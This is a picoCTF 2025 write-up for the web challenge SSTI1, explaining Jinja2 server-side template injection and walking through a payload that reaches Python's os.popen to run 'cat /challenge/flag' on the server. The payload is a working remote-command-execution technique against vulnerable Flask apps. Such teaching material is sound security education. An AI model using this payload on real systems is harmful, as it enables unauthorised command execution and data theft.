---
author: Nishanth Jadav
pubDatetime: 2025-03-22T12:38:05Z
modDatetime: 2025-03-22T12:38:05Z
title: picoCTF 2025 - SSTI1
slug: picoctf-2025-SSTI1
featured: true
draft: false
tags:
  - web
  - picoCTF2025
  - easy
description: A writeup for the web exploitation challenge SSTI1
---

## Table of contents

## Challenge-Information 

100 Points

Tags: picoCTF 2025, Web Exploitation, browser_webshell_solvable

Author: VENAX

Challenge Link: https://play.picoctf.org/practice/challenge/492

## Explanation
# CTF Write-Up: Jinja2 Web Exploit

## Background

In this CTF challenge, the goal was to exploit a web application using Jinja2 template injection. Jinja2 is a common templating engine for Python that allows developers to inject variables and execute Python code within templates. Exploiting Jinja2 vulnerabilities often involves creating payloads that manipulate the template engine to execute arbitrary commands.

## Challenge Description

The challenge provided a web application vulnerable to Jinja2 template injection. The objective was to read the contents of a file located at `/challenge/flag` on the server.

## Exploitation Strategy

### Understanding Jinja2 Injection

Jinja2 allows access to global variables through the `__globals__` attribute of the `application` object in Flask applications. By leveraging this feature, it's possible to access built-in Python functions such as `__import__` and subsequently execute commands.

### Payload Breakdown

The payload used for this exploit was:

```
{{ request.application.__globals__.__builtins__.__import__('os').popen('cat /challenge/flag').read() }}
```

Let's examine this more closely starting with:
```
{{ ... }}
```

This is a Jinja2 expression, used to evaluate and render dynamic content in a template. 

```
request.application
```

This line accesses the ```application``` attribute of the ```request``` object.

```
.__globals__
```

Retrieves the global namespace, which contains built-in objects and functions.

```
.__builtins__
```

Accesses Python's built-in functions and modules.

```
.__import__('os')
```

Dynamically imports the ```os``` module, which allows interaction with the operating system. Note: commands like this one are obviously vulnerable to exploits, and were blacklisted in the more difficult, part 2 of this problem, SSTI2.

And now, accessing the flag with: 
```
.popen('cat /challenge/flag')
```

Executes the shell command: 
```
cat /challenge/flag
```

Reading the contents of the file ```/challenge/flag```

And lastly,
```
.read()
```

Reads and **returns the output** of the executed command.

## References
- https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/
